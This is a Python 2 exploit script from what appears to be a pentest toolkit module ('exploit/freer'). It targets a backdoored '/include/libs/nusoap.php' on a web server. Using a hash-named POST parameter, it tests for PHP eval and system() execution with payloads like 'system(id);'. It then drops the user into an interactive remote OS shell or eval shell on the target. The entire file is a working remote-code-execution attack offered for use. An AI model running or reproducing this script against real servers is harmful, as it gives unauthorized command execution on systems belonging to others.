import requests
import os
import sys
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue
E = '\033[0m' # End

def inputs():
    target = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/freer (set target)"+N+"): ")
    print "URL =>"+R+"",target
    while True:
	try:
            r = requests.get(target,verify=False)
            start(target)
        except requests.exceptions.MissingSchema:
	    target = "http://" + target

def start(target):
    print "\n[!] Checking: ****()"
    url = '%s/include/libs/nusoap.php' % (target)
    body = {'a74ad8dfacd4f985eb3977517615ce25':'echo vulnerable;'}
    r = requests.post(url,data=body,allow_redirects=False,timeout=50)
    content = r.text.encode('utf-8')
    if 'vulnerable' in content:
        print "[+] vulnerable: ****()\n"
    else:
        print "[-] Target not Vulnerable!"
	sys.exit(1)
    print "\n[!] Checking: System()"
    body = {'a74ad8dfacd4f985eb3977517615ce25':'system(id);'}
    r = requests.post(url,data=body,allow_redirects=False,timeout=50)
    content = r.text.decode('utf-8')
    if 'gid' in content:
        print "[+] vulnerable: system()\n"
	osshell(url)
    else:
        print "[-] Target not Vulnerable to Running OS Commands!"
	evalshell(url)

def osshell(url):
    print "======================\n[+] You can run os commands :D\n"
    while True:
	try:
            cmd = raw_input('OS_SHELL $ ')
            command = "system('%s');" % (cmd)
            body = {'a74ad8dfacd4f985eb3977517615ce25':command}
            r = requests.post(url,data=body,allow_redirects=False,timeout=50)
            content = r.text.encode('utf-8')
            print "\n",content
        except KeyboardInterrupt:
            print "\n____________________\n[+] GoodBye :D"
            sys.exit(1)

def evalshell(url):
    print "======================\n[+] You can just run Eval Commands :D\n"
    while True:
	try:
            cmd = raw_input('\nEval()=> ')
            command = '%s;' % (cmd)
            body = {'a74ad8dfacd4f985eb3977517615ce25':command}
            r = requests.post(url,data=body,allow_redirects=False,timeout=50)
            content = r.text.encode('utf-8')
            print "\n",content
        except KeyboardInterrupt:
           sys.exit()
if __name__ == '__main__':
	inputs()